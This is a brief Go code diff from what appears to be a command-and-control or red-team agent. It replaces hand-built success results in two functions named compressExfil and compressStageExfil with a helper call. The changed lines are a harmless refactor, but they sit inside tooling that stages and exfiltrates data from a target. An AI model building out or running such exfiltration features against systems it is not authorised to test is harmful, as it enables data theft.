@@ -101,11 +101,7 @@ func compressExfil(task structs.Task, params CompressParams) structs.CommandResu
 			if err != nil {
 				return errorf("failed to marshal result: %v", err)
 			}
-			return structs.CommandResult{
-				Output:    string(metadataJSON),
-				Status:    "success",
-				Completed: true,
-			}
+			return successResult(string(metadataJSON))
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
 				file.Close()
@@ -174,11 +170,7 @@ func compressStageExfil(task structs.Task, params CompressParams) structs.Comman
 		return errorf("failed to marshal result: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    string(combinedJSON),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(string(combinedJSON))
 }
 
 // stageExfilMetadata holds the combined result of stage + exfil.
